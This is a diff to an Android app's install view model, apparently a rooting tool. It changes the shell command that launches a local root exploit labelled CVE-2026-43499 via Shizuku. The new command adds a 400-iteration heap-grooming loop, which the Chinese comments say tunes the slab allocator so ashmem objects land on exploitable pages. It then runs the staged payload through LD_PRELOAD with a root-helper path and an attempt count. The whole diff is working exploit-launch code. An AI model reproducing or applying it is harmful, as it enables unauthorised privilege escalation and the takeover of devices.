@@ -198,13 +198,15 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         val process = if (shizuku) {
             val stagedPayload = shizukuStage(payload, SHIZUKU_PAYLOAD_PATH, "755")
             appendLog("[diag] Shizuku branch: payload=${stagedPayload.absolutePath}")
-            // v0.2.28+: 完全对齐 s9180-root-kit 工具包/F7310 App 的命令
-            // CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root EXPLOIT_ATTEMPTS=N LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true
+            // v0.2.32+: 完全对齐 s9180-root-kit 工具包 run_root.sh（作者验证过的调用方式）：
+            //   1) WARMUP 400x /system/bin/true（调整 slab 分配器状态，让 ashmem 对象落在可利用页）
+            //   2) 仅 3 个环境变量（无 PSELECT_DELAY_USEC）
+            //   3) CVE43499_ROOT_HELPER=... EXPLOIT_ATTEMPTS=N LD_PRELOAD=... /system/bin/true
             ShizukuController.exec(
                 arrayOf(
                     "/system/bin/sh",
                     "-c",
-                    "CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true 2>&1",
+                    "i=0; while [ $i -lt 400 ]; do /system/bin/true; i=$((i+1)); done; CVE43499_ROOT_HELPER=${shellQuote(helper.absolutePath)} EXPLOIT_ATTEMPTS=$EXPLOIT_ATTEMPTS LD_PRELOAD=${shellQuote(stagedPayload.absolutePath)} /system/bin/true 2>&1",
                 ),
                 emptyArray(),
             )
